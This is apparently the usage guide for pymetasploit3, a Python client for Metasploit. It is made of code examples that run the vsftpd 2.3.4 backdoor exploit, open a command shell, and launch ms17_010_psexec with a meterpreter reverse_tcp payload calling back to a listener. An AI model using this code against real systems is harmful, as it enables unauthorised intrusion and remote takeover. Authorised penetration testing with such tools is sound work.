from pymetasploit3.msfrpc import MsfRpcClient

## Usage example

# Connect to the RPC server
client = MsfRpcClient('mypassword')

# Get an exploit object
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

# Set the exploit options
exploit['RHOST'] = "192.168.115.80"
exploit['RPORT'] = "21"

# Execute the exploit, success will return a jobid
exploit.execute(payload="cmd/unix/interact")

# Find all available sessions
print("Sessions avaiables : ")
for s in client.sessions.list.keys():
	print(s)

# Get a shell object
shell = client.sessions.session(list(client.sessions.list.keys())[0])

# Write to the shell
shell.write('whoami')

# Print the output
print(shell.read())

# Stop the shell
shell.stop()



## Console

# Create a console and get the new console ID
client.consoles.console().cid
# >>> "1"

# Destroy a console
client.console.console('1').destroy

# Write to console
client.consoles.console('1').write('show options')

# Read from console
client.consoles.console('1').read()
# >>> {'data': 'Global Options:\n===============\n\n   Option...'
#      'prompt': '\x01\x02msf5\x01\x02 \x01\x02> ',
#      'busy': False}

# Check if console is busy
client.consoles.console('1').is_busy()
# >>> False


## Modules

# List exploit modules
client.modules.exploits
# >>> ['aix/local/ibstat_path',
#      'aix/rpc_cmsd_opcode21',
#      'aix/rpc_ttdbserverd_realpath',
#       ...]

# Use a module
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

# Set module options
exploit['RHOST'] = "192.168.115.80"
exploit['RPORT'] = "21"

# Get required options
exploit.required
# >>> ['RHOSTS', 'RPORT', 'SSLVersion', 'ConnectTimeout']

# Get required options that haven't been set yet
exploit.missing_required
# >>> ['RHOSTS']

# See all the options which have been set
exploit.runoptions
# >>> {'VERBOSE': False,
#      'WfsDelay': 0,
#      'EnableContextEncoding': False,
#      'DisablePayloadHandler': False,
#      'RPORT': 21,
#      'SSL': False,
#      'SSLVersion': 'Auto',
#      'SSLVerifyMode': 'PEER',
#      'ConnectTimeout': 10,
#      'TCP::max_send_size': 0,
#      'TCP::send_delay': 0}

# Get the CVE/OSVDB/BID of an exploit
exploit.references
# >>> [['CVE', '2013-4011'],
#      ['OSVDB', '95420'],
#  	   ['BID', '61287'],
#      ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=isg1IV43827'],
#      ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=isg1IV43756']]

# Get an option's info
exploit.optioninfo('RHOSTS')
# >>> {'type': 'addressrange',
#      'required': True,
#      'advanced': False,
#      'evasion': False,
#      'desc': 'The target address range or CIDR identifier'}

# Get targets
exploit.targets
# >>> {0: 'Automatic'}

# Set the target
exploit.target = 0

# Get target-compatible payloads
exploit.targetpayloads()
# >>> ['cmd/unix/interact']

# Execute the module
# If 'job_id' is None, the module failed to execute
exploit.execute(payload='cmd/unix/interact')
# >>> {'job_id': 1, 'uuid': 'hb2f0yei'}

# Execute the module and return the output
cid = client.consoles.console().cid
client.consoles.console(cid).run_module_with_output(exploit, payload='cmd/unix/interact')
# >>> '... [-] 127.0.0.1:21 - Exploit failed [unreachable]: Rex::ConnectionRefused \
# 	   The connection was refused by the remote host (127.0.0.1:21).\n[*] Exploit completed, but no session was created.\n'


## Sessions

# Get all sessions
client.sessions.list
# >>> {'1': {'type': 'meterpreter',
#      'tunnel_local': '192.168.1.2:4444',
#	    [...]
#      'platform': 'windows'}}

# Get a session's info
client.sessions.session('1').info

# Write to a session
client.sessions.session('1').write('help')

# Read a session
client.sessions.session('1').read()
# >>> '\nCore Commands\n=============\n\n    Command                   Description\n    ------- [...]'

# Run a command and wait for the output
client.sessions.session('1').run_with_output('arp')
# >>> '\nArp stuff'

# Run a shell command within a meterpreter session
client.sessions.session('1').run_shell_cmd_with_output('whoami')


# How to set Payload Options
# Some exploits need to set payload options, here's an example on how to do so
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
exploit['RHOSTS'] = '172.28.128.13'

# create a payload object as normal
payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')

# add paylod specific options
payload['LHOST'] = '172.28.128.1'
payload['LPORT'] = 4444

# Execute the exploit with the linked payload, success will return a jobid
exploit.execute(payload=payload)
